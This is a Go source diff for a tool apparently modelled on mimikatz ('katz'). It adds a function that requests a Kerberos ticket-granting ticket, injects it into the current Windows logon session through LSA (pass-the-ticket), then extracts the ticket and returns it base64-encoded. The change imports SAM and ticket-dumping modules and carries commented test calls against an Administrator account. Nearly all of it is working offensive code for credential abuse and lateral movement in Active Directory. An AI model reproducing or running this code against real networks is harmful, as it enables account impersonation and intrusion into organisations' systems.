@@ -7,6 +7,7 @@ import (
 	"io"
 	"katz/katz/modules/kerb/ticketdump"
 	"katz/katz/modules/sam"
+	"katz/katz/modules/kerb/ptt"
 	"katz/katz/utils"
 	"strings"
 	"time"
@@ -208,3 +209,51 @@ func GetKerberosTickets() []map[string]interface{} {
 	return nil
 }
 
+func TGT(username, domain, password, serviceName string) (response string, err error){
+	tgt, err := ptt.TGT(domain, username, password, serviceName)
+	if err != nil {
+		return
+	}
+	var responseptr uintptr
+	// tgt, _ := test.TGT("test.local", "Administrator", "password")
+	handle, err := ticketdump.GetLsaHandle()
+	if err != nil {
+		return
+	}
+	// handle, _ := test_helpers.GetLsaHandle()
+
+	LUID, err := ticketdump.GetCurrentLUID()
+	if err != nil {
+		return
+	}
+	// LUID, _ := test_helpers.GetCurrentLUID()
+
+	err, responseptr = ptt.Ptt(tgt, handle, LUID)
+	if err != nil {
+		return
+	}
+	// err := test.Ptt(tgt, handle, LUID)
+	kerb := ticketdump.NewLSAString("kerberos")
+
+	// kerb := test_helpers.NewLSAString("kerberos")
+	pkgName, err := ticketdump.GetAuthenticationPackage(handle, kerb)
+	if err != nil {
+		return
+	}
+	// pkgName, _ := test_helpers.GetAuthenticationPackage(handle, kerb)
+	// fmt.Println(err)
+	// err = test.PttMinimal()
+	// fmt.Println(err)
+	// serviceName := "krbtgt/" + strings.ToUpper(domain)
+	tgt_raw, err := ticketdump.ExtractTicket(handle, pkgName, LUID,serviceName)
+	if err != nil {
+		return
+	}
+	response = base64.StdEncoding.EncodeToString(tgt_raw)
+	// data, err := test_helpers.ExtractTicket(handle, pkgName, LUID, "krbtgt/TEST.LOCAL")
+	// fmt.Println(base64.StdEncoding.EncodeToString(data))
+
+	ptt.Cleanup(responseptr)
+	return
+
+}
